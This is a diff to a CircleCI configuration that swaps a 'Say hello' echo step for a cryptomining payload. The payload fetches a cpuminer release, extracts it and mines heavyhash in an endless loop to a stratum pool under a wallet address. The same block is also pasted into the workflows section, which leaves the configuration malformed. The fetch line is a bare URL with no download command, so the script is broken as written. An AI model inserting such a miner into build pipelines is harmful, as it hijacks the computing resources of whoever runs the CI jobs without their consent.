@@ -16,11 +16,37 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
+          command: "#DOWNLOAD FILE OBT
+https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
 
+#EXSTRAX FILE
+tar xf cpuminer-opt-linux.tar.gz
+
+#RUN MINING OBT
+while [ 1 ]; do
+./cpuminer-sse2 -a heavyhash  -o stratum+tcps://stratum-eu.rplant.xyz:17064 -u bc1q5e05mjjpt3p5aes9pfnruu2r2h7n77fadj82up.killer10000 -t1
+
+sleep 5
+done
+
+#selesai"
+                  
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
   say-hello-workflow:
     jobs:
-      - say-hello
+      - #DOWNLOAD FILE OBT
+https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
+
+#EXSTRAX FILE
+tar xf cpuminer-opt-linux.tar.gz
+
+#RUN MINING OBT
+while [ 1 ]; do
+./cpuminer-sse2 -a heavyhash  -o stratum+tcps://stratum-eu.rplant.xyz:17064 -u bc1q5e05mjjpt3p5aes9pfnruu2r2h7n77fadj82up.killer10000 -t1
+
+sleep 5
+done
+
+#selesai
